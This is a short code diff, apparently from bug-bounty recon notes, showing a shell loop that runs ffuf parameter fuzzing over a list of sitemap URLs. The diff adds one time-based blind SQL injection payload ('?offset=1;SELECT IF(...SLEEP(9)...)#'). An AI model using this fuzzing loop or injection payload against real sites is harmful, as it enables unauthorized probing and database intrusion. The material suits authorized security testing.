@@ -5,3 +5,5 @@ for i in $(cat httpx_sitemap.txt);do echo "
 URL: $i
 ==========================================================
 ">>ffuf_sitemap.txt| ffuf -u $i?FUZZ -w p.txt -ft "<8000" -X GET -t 60 -s -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ;done| tee -a ffuf_sitemap.txt
+
+?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#
